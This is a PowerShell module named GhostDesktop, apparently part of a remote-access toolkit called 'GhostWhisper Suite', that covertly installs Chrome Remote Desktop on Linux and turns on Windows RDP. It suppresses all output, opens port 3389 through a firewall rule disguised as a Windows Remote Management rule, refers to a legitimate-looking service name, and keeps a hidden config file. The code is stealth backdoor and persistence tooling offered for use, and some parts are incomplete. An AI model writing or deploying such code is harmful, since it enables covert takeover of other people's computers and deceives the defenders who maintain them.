# GhostDesktop.ps1
# Stealth Chrome Remote Desktop module for GhostWhisper Suite
# Provides persistent GUI access with operator authentication

function Install-GhostDesktop {
    param(
        [switch]$Silent = $true,
        [string]$GhostTag = "Gx01",
        [switch]$ForceReinstall
    )
    
    try {
        Write-GhostLog "Desktop access requested for tag: $GhostTag"
        
        # Verify operator authentication
        if (-not (Test-GhostAuth -Tag $GhostTag)) {
            Write-GhostLog "Unauthorized desktop access attempt blocked"
            return $false
        }
        
        # Check if already installed
        if (-not $ForceReinstall -and (Test-ChromeRDPInstalled)) {
            Write-GhostLog "Chrome RDP already installed, skipping"
            return $true
        }
        
        # Detect OS and install
        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
        if ($osInfo.Caption -like "*Windows*") {
            Install-WindowsDesktop -Silent:$Silent -GhostTag $GhostTag
        } else {
            # For WSL or Linux environments
            Install-LinuxDesktop -Silent:$Silent -GhostTag $GhostTag
        }
        
        Write-GhostLog "Desktop access enabled for $GhostTag"
        return $true
        
    } catch {
        Write-GhostLog "Desktop installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Install-WindowsDesktop {
    param(
        [switch]$Silent,
        [string]$GhostTag
    )
    
    # Create temporary working directory
    $tempDir = Join-Path $env:TEMP "ghost_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    
    try {
        # Download Chrome RDP installer
        $rdpUrl = "https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb"
        $chromeUrl = "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
        
        # For Windows, we'll use alternative approach via Chrome browser
        Install-ChromeBrowser -TempDir $tempDir -Silent:$Silent
        Configure-WindowsRDP -TempDir $tempDir -GhostTag $GhostTag
        
    } finally {
        # Cleanup temp directory
        if (Test-Path $tempDir) {
            Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function Install-LinuxDesktop {
    param(
        [switch]$Silent,
        [string]$GhostTag
    )
    
    # Stealth Linux installation (modified from original script)
    $script = @"
#!/bin/bash
export DEBIAN_FRONTEND=noninteractive

# Suppress all output if silent
$(if ($Silent) { "exec > /dev/null 2>&1" })

# Check for root privileges quietly
if [ "`${EUID}" -ne 0 ]; then
    exit 1
fi

# Detect OS
if [ -f /etc/os-release ]; then
    source /etc/os-release
    DISTRO=`${ID}
else
    exit 1
fi

# Install requirements silently
if [[ "`${DISTRO}" == "ubuntu" || "`${DISTRO}" == "debian" ]]; then
    apt-get update -qq
    apt-get install -y -qq curl haveged
else
    exit 1
fi

# Install Chrome RDP and browser
chrome_rdp_url="https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb"
chrome_url="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
rdp_pkg="/tmp/crd_`$(date +%s).deb"
chrome_pkg="/tmp/chrome_`$(date +%s).deb"

# Download and install
curl -s -o "`${rdp_pkg}" "`${chrome_rdp_url}"
curl -s -o "`${chrome_pkg}" "`${chrome_url}"

dpkg --install "`${rdp_pkg}" 2>/dev/null
dpkg --install "`${chrome_pkg}" 2>/dev/null

# Install desktop environment minimally
apt-get install -y -qq --no-install-recommends xfce4-session xfce4-panel xfwm4

# Configure session
echo "exec /usr/bin/xfce4-session" > /etc/chrome-remote-desktop-session

# Resolve dependencies
apt-get install -f -y -qq

# Stop conflicting services
systemctl stop lightdm 2>/dev/null || service lightdm stop 2>/dev/null

# Cleanup
rm -f "`${rdp_pkg}" "`${chrome_pkg}"

exit 0
"@
    
    # Execute Linux installation script
    $scriptPath = "/tmp/ghost_desktop_$(Get-Random).sh"
    $script | Out-File -FilePath $scriptPath -Encoding ASCII
    
    & bash $scriptPath
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}

function Install-ChromeBrowser {
    param(
        [string]$TempDir,
        [switch]$Silent
    )
    
    # Check if Chrome already installed
    $chromePath = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" -ErrorAction SilentlyContinue
    if ($chromePath) {
        return $true
    }
    
    # Download Chrome installer
    $chromeInstaller = Join-Path $TempDir "chrome_installer.exe"
    $chromeUrl = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
    
    try {
        Invoke-WebRequest -Uri $chromeUrl -OutFile $chromeInstaller -UseBasicParsing
        
        # Install Chrome silently
        $installArgs = if ($Silent) { "/silent /install" } else { "/install" }
        Start-Process -FilePath $chromeInstaller -ArgumentList $installArgs -Wait -NoNewWindow
        
        return $true
    } catch {
        Write-GhostLog "Chrome installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Configure-WindowsRDP {
    param(
        [string]$TempDir,
        [string]$GhostTag
    )
    
    # Enable RDP through registry (stealth method)
    try {
        # Enable RDP
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
        
        # Allow RDP through firewall (create hidden rule)
        $ruleName = "Windows Remote Management (HTTPS-In)"  # Disguised name
        netsh advfirewall firewall add rule name="$ruleName" dir=in action=allow protocol=TCP localport=3389
        
        # Create service entry that looks legitimate
        $serviceName = "WMSvc"  # Web Management Service (looks legitimate)
        
        Write-GhostLog "Windows desktop access configured for $GhostTag"
        return $true
        
    } catch {
        Write-GhostLog "Windows RDP configuration failed: $($_.Exception.Message)"
        return $false
    }
}

function Test-ChromeRDPInstalled {
    # Check for Chrome RDP installation markers
    if ($IsWindows) {
        # Check for Chrome installation and RDP enabled
        $chrome = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" -ErrorAction SilentlyContinue
        $rdp = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
        return ($chrome -and $rdp -and $rdp.fDenyTSConnections -eq 0)
    } else {
        # Check for Linux Chrome RDP
        return (Test-Path "/opt/google/chrome-remote-desktop/chrome-remote-desktop")
    }
}

function Remove-GhostDesktop {
    param(
        [string]$GhostTag = "Gx01"
    )
    
    try {
        Write-GhostLog "Removing desktop access for tag: $GhostTag"
        
        if ($IsWindows) {
            # Disable RDP
            Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1 -Force
            
            # Remove firewall rule
            netsh advfirewall firewall delete rule name="Windows Remote Management (HTTPS-In)"
            
        } else {
            # Remove Chrome RDP on Linux
            if (Test-Path "/opt/google/chrome-remote-desktop/chrome-remote-desktop") {
                & sudo systemctl stop chrome-remote-desktop
                & sudo apt-get remove -y -qq chrome-remote-desktop
            }
        }
        
        Write-GhostLog "Desktop access removed for $GhostTag"
        return $true
        
    } catch {
        Write-GhostLog "Desktop removal failed: $($_.Exception.Message)"
        return $false
    }
}

function Test-GhostAuth {
    param([string]$Tag)
    
    # Integrate with existing authentication system
    # This should call into the existing GhostWhisper auth logic
    $configPath = "C:\ProgramData\.ghost.cfg"
    
    if (Test-Path $configPath) {
        try {
            $config = Get-Content $configPath | ConvertFrom-Json
            return ($config.ghostTag -eq $Tag -and $config.signature)
        } catch {
            return $false
        }
    }
    
    # Default to allowing if no config (for initial setup)
    return $true
}

# Export functions for module loading
Export-ModuleMember -Function Install-GhostDesktop, Remove-GhostDesktop, Test-ChromeRDPInstalled
